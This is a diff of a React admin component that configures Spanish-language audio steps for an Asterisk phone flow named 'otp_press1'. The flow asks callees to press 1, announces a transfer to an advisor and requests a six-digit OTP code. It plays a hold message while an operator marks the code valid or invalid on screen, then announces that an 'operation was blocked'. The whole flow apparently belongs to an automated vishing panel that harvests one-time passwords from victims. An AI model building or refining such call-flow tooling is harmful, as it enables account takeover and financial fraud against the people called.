                   {(callFlowMode === 'otp_press1' || activeSelectedEntity?.flowScope === 'otp_press1') ? (
                     <>
-                      <option value="introAudioPath">1. Saludo Inicial (Pide marcar 1)</option>
-                      <option value="otpVerifyWaitAudioPath">2. Al Marcar 1 (Enviando Código)</option>
-                      <option value="promptAudioPath">3. Pedir Digitar el Código OTP</option>
-                      <option value="waitAudioPath">4. Validando Información (Espera)</option>
-                      <option value="successAudioPath">5. Código Válido / Éxito Final</option>
+                      <option value="introAudioPath">1. Saludo / Alerta Inicial (Intro)</option>
+                      <option value="agentAudioPath">2. Transferencia a Asesor (Opción 1 - "Un momento por favor...")</option>
+                      <option value="promptAudioPath">3. Solicitud de Código OTP / Bienvenida</option>
+                      <option value="waitAudioPath">4. Espera de Validación</option>
+                      <option value="successAudioPath">5. Código Aprobado / Éxito</option>
                       <option value="failureAudioPath">6. Código Inválido / Reintento</option>
                     </>
                   ) : (
@@ -7526,229 +7560,243 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
 
                 {editingEntity.flowScope === 'otp_press1' ? (
-                  <div className="space-y-3">
-                    {/* 1. Saludo Inicial */}
-                    <div className="p-3.5 rounded-xl bg-slate-950 border border-emerald-500/30 space-y-2">
-                      <div className="flex items-center justify-between">
-                        <div>
-                          <div className="text-xs font-bold text-emerald-300">1. Saludo Inicial (Pide marcar 1)</div>
-                          <div className="text-[11px] text-slate-400">Se escucha al contestar la llamada e invita a marcar 1.</div>
-                        </div>
-                        <button
-                          type="button"
-                          onClick={() => handleTogglePlayAudio(editingEntity.introAudioPath, 'modal_intro')}
-                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
-                        >
-                          {playingAudioKey === 'modal_intro' ? <Pause className="w-4 h-4 text-emerald-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
-                        </button>
+                  <div className="space-y-4">
+                    <div className="space-y-3">
+                      <div className="text-[11px] font-bold text-cyan-300 uppercase tracking-wider flex items-center gap-1.5">
+                        <Zap className="w-3.5 h-3.5 text-cyan-400" />
+                        <span>Paso Inicial: Saludo y Opción 1</span>
                       </div>
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                        <select
-                          value={editingEntity.introAudioPath}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
-                        >
-                          <option value="custom/bienvenida_corporativa">custom/bienvenida_corporativa</option>
-                          {audios.map((a) => (
-                            <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                          ))}
-                        </select>
-                        <input
-                          type="text"
-                          value={editingEntity.introAudioPath}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
-                        />
+
+                      {/* 1. Saludo / Alerta Inicial (Intro) */}
+                      <div className="p-3.5 rounded-xl bg-slate-950 border border-emerald-500/30 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs font-bold text-emerald-300">1. Saludo / Alerta Inicial (Intro)</div>
+                            <div className="text-[11px] text-slate-400">Se reproduce al contestar la llamada e invita a marcar 1.</div>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => handleTogglePlayAudio(editingEntity.introAudioPath, 'modal_intro')}
+                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+                          >
+                            {playingAudioKey === 'modal_intro' ? <Pause className="w-4 h-4 text-emerald-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
+                          </button>
+                        </div>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          <select
+                            value={editingEntity.introAudioPath}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
+                          >
+                            <option value="custom/bienvenida_corporativa">custom/bienvenida_corporativa</option>
+                            {audios.map((a) => (
+                              <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                            ))}
+                          </select>
+                          <input
+                            type="text"
+                            value={editingEntity.introAudioPath}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
+                          />
+                        </div>
+                      </div>
+
+                      {/* 2. Transferencia a Asesor (Opción 1 - "Un momento por favor...") */}
+                      <div className="p-3.5 rounded-xl bg-slate-950 border border-cyan-500/40 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs font-bold text-cyan-300">2. Transferencia a Asesor (Opción 1 - "Un momento por favor...")</div>
+                            <div className="text-[11px] text-slate-400">Suena justo cuando el cliente presiona 1, antes de pedir el código OTP.</div>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => handleTogglePlayAudio(editingEntity.agentAudioPath || 'custom/conectar_asesor', 'modal_agent')}
+                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+                          >
+                            {playingAudioKey === 'modal_agent' ? <Pause className="w-4 h-4 text-cyan-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
+                          </button>
+                        </div>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          <select
+                            value={editingEntity.agentAudioPath || 'custom/conectar_asesor'}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
+                          >
+                            <option value="custom/conectar_asesor">custom/conectar_asesor</option>
+                            {audios.map((a) => (
+                              <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                            ))}
+                          </select>
+                          <input
+                            type="text"
+                            value={editingEntity.agentAudioPath || 'custom/conectar_asesor'}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
+                          />
+                        </div>
                       </div>
                     </div>
 
-                    {/* 2. Al Marcar 1 */}
-                    <div className="p-3.5 rounded-xl bg-slate-950 border border-cyan-500/40 space-y-2">
-                      <div className="flex items-center justify-between">
-                        <div>
-                          <div className="text-xs font-bold text-cyan-300">2. Al Marcar 1 ("Le estamos enviando su código...")</div>
-                          <div className="text-[11px] text-slate-400">Suena justo cuando el cliente presiona 1.</div>
-                        </div>
-                        <button
-                          type="button"
-                          onClick={() => handleTogglePlayAudio(editingEntity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion', 'modal_otp_verify_wait')}
-                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
-                        >
-                          {playingAudioKey === 'modal_otp_verify_wait' ? <Pause className="w-4 h-4 text-cyan-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
-                        </button>
+                    <div className="space-y-3 pt-3 border-t border-slate-800">
+                      <div className="text-[11px] font-bold text-purple-300 uppercase tracking-wider flex items-center gap-1.5">
+                        <KeyRound className="w-3.5 h-3.5 text-purple-400" />
+                        <span>Para Pedir y Validar el OTP</span>
                       </div>
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                        <select
-                          value={editingEntity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, otpVerifyWaitAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
-                        >
-                          <option value="custom/enviando_codigo_verificacion">custom/enviando_codigo_verificacion</option>
-                          {audios.map((a) => (
-                            <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                          ))}
-                        </select>
-                        <input
-                          type="text"
-                          value={editingEntity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, otpVerifyWaitAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
-                        />
-                      </div>
-                    </div>
 
-                    {/* 3. Pedir Código OTP */}
-                    <div className="p-3.5 rounded-xl bg-slate-950 border border-purple-500/30 space-y-2">
-                      <div className="flex items-center justify-between">
-                        <div>
-                          <div className="text-xs font-bold text-purple-300">3. Pedir Digitar el Código OTP</div>
-                          <div className="text-[11px] text-slate-400">Le indica al cliente que digite su código y termine con #.</div>
+                      {/* 3. Solicitud de Código OTP / Bienvenida */}
+                      <div className="p-3.5 rounded-xl bg-slate-950 border border-purple-500/30 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs font-bold text-purple-300">3. Solicitud de Código OTP / Bienvenida</div>
+                            <div className="text-[11px] text-slate-400">Le indica al cliente que digite su código y termine con #.</div>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => handleTogglePlayAudio(editingEntity.promptAudioPath, 'modal_prompt')}
+                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+                          >
+                            {playingAudioKey === 'modal_prompt' ? <Pause className="w-4 h-4 text-purple-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
+                          </button>
                         </div>
-                        <button
-                          type="button"
-                          onClick={() => handleTogglePlayAudio(editingEntity.promptAudioPath, 'modal_prompt')}
-                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
-                        >
-                          {playingAudioKey === 'modal_prompt' ? <Pause className="w-4 h-4 text-purple-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
-                        </button>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          <select
+                            value={editingEntity.promptAudioPath}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
+                          >
+                            <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos</option>
+                            <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos</option>
+                            <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp</option>
+                            {audios.map((a) => (
+                              <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                            ))}
+                          </select>
+                          <input
+                            type="text"
+                            value={editingEntity.promptAudioPath}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
+                          />
+                        </div>
                       </div>
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                        <select
-                          value={editingEntity.promptAudioPath}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
-                        >
-                          <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos</option>
-                          <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos</option>
-                          <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp</option>
-                          {audios.map((a) => (
-                            <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                          ))}
-                        </select>
-                        <input
-                          type="text"
-                          value={editingEntity.promptAudioPath}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
-                        />
-                      </div>
-                    </div>
 
-                    {/* 4. Validando Información */}
-                    <div className="p-3.5 rounded-xl bg-slate-950 border border-indigo-500/40 space-y-2">
-                      <div className="flex items-center justify-between">
-                        <div>
-                          <div className="text-xs font-bold text-indigo-300">4. Validando Información ("Un momento, estamos validando...")</div>
-                          <div className="text-[11px] text-slate-400">Suena mientras decides en pantalla Válido o Inválido.</div>
+                      {/* 4. Espera de Validación */}
+                      <div className="p-3.5 rounded-xl bg-slate-950 border border-indigo-500/40 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs font-bold text-indigo-300">4. Espera de Validación</div>
+                            <div className="text-[11px] text-slate-400">Suena mientras decides en pantalla Válido o Inválido.</div>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => handleTogglePlayAudio(editingEntity.waitAudioPath || 'custom/un_momento_validando_informacion', 'modal_wait')}
+                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+                          >
+                            {playingAudioKey === 'modal_wait' ? <Pause className="w-4 h-4 text-indigo-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
+                          </button>
                         </div>
-                        <button
-                          type="button"
-                          onClick={() => handleTogglePlayAudio(editingEntity.waitAudioPath || 'custom/un_momento_validando_informacion', 'modal_wait')}
-                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
-                        >
-                          {playingAudioKey === 'modal_wait' ? <Pause className="w-4 h-4 text-indigo-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
-                        </button>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          <select
+                            value={editingEntity.waitAudioPath || 'custom/un_momento_validando_informacion'}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, waitAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
+                          >
+                            <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion</option>
+                            {audios.map((a) => (
+                              <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                            ))}
+                          </select>
+                          <input
+                            type="text"
+                            value={editingEntity.waitAudioPath || 'custom/un_momento_validando_informacion'}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, waitAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
+                          />
+                        </div>
                       </div>
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                        <select
-                          value={editingEntity.waitAudioPath || 'custom/un_momento_validando_informacion'}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, waitAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
-                        >
-                          <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion</option>
-                          {audios.map((a) => (
-                            <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                          ))}
-                        </select>
-                        <input
-                          type="text"
-                          value={editingEntity.waitAudioPath || 'custom/un_momento_validando_informacion'}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, waitAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
-                        />
-                      </div>
-                    </div>
 
-                    {/* 5. Código Válido / Éxito */}
-                    <div className="p-3.5 rounded-xl bg-slate-950 border border-emerald-500/40 space-y-2">
-                      <div className="flex items-center justify-between">
-                        <div>
-                          <div className="text-xs font-bold text-emerald-300">5. Código Válido / Éxito Final</div>
-                          <div className="text-[11px] text-slate-400">Suena cuando presionas Código Válido antes de colgar.</div>
+                      {/* 5. Código Aprobado / Éxito */}
+                      <div className="p-3.5 rounded-xl bg-slate-950 border border-emerald-500/40 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs font-bold text-emerald-300">5. Código Aprobado / Éxito</div>
+                            <div className="text-[11px] text-slate-400">Suena cuando presionas Código Válido antes de colgar.</div>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => handleTogglePlayAudio(editingEntity.successAudioPath, 'modal_success')}
+                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+                          >
+                            {playingAudioKey === 'modal_success' ? <Pause className="w-4 h-4 text-emerald-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
+                          </button>
                         </div>
-                        <button
-                          type="button"
-                          onClick={() => handleTogglePlayAudio(editingEntity.successAudioPath, 'modal_success')}
-                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
-                        >
-                          {playingAudioKey === 'modal_success' ? <Pause className="w-4 h-4 text-emerald-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
-                        </button>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          <select
+                            value={editingEntity.successAudioPath}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
+                          >
+                            <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
+                            <option value="auth-thankyou">auth-thankyou</option>
+                            {audios.map((a) => (
+                              <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                            ))}
+                          </select>
+                          <input
+                            type="text"
+                            value={editingEntity.successAudioPath}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
+                          />
+                        </div>
                       </div>
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                        <select
-                          value={editingEntity.successAudioPath}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
-                        >
-                          <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
-                          <option value="auth-thankyou">auth-thankyou</option>
-                          {audios.map((a) => (
-                            <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                          ))}
-                        </select>
-                        <input
-                          type="text"
-                          value={editingEntity.successAudioPath}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
-                        />
-                      </div>
-                    </div>
 
-                    {/* 6. Código Inválido / Reintento */}
-                    <div className="p-3.5 rounded-xl bg-slate-950 border border-rose-500/40 space-y-2">
-                      <div className="flex items-center justify-between">
-                        <div>
-                          <div className="text-xs font-bold text-rose-300">6. Código Inválido / Reintento</div>
-                          <div className="text-[11px] text-slate-400">Suena cuando presionas Inválido para que vuelva a digitar el código.</div>
+                      {/* 6. Código Inválido / Reintento */}
+                      <div className="p-3.5 rounded-xl bg-slate-950 border border-rose-500/40 space-y-2">
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs font-bold text-rose-300">6. Código Inválido / Reintento</div>
+                            <div className="text-[11px] text-slate-400">Suena cuando presionas Inválido para que vuelva a digitar el código.</div>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => handleTogglePlayAudio(editingEntity.failureAudioPath || 'custom/token_invalido_reintente', 'modal_failure')}
+                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+                          >
+                            {playingAudioKey === 'modal_failure' ? <Pause className="w-4 h-4 text-rose-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
+                          </button>
                         </div>
-                        <button
-                          type="button"
-                          onClick={() => handleTogglePlayAudio(editingEntity.failureAudioPath || 'custom/token_invalido_reintente', 'modal_failure')}
-                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
-                        >
-                          {playingAudioKey === 'modal_failure' ? <Pause className="w-4 h-4 text-rose-400 animate-pulse" /> : <Play className="w-4 h-4 text-slate-300" />}
-                        </button>
-                      </div>
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                        <select
-                          value={editingEntity.failureAudioPath || 'custom/token_invalido_reintente'}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, failureAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
-                        >
-                          <option value="custom/token_invalido_reintente">custom/token_invalido_reintente</option>
-                          {audios.map((a) => (
-                            <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                          ))}
-                        </select>
-                        <input
-                          type="text"
-                          value={editingEntity.failureAudioPath || 'custom/token_invalido_reintente'}
-                          onChange={(e) => setEditingEntity({ ...editingEntity, failureAudioPath: e.target.value })}
-                          disabled={!isAdmin}
-                          className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
-                        />
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          <select
+                            value={editingEntity.failureAudioPath || 'custom/token_invalido_reintente'}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, failureAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
+                          >
+                            <option value="custom/token_invalido_reintente">custom/token_invalido_reintente</option>
+                            {audios.map((a) => (
+                              <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                            ))}
+                          </select>
+                          <input
+                            type="text"
+                            value={editingEntity.failureAudioPath || 'custom/token_invalido_reintente'}
+                            onChange={(e) => setEditingEntity({ ...editingEntity, failureAudioPath: e.target.value })}
+                            disabled={!isAdmin}
+                            className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
+                          />
+                        </div>
                       </div>
                     </div>
                   </div>
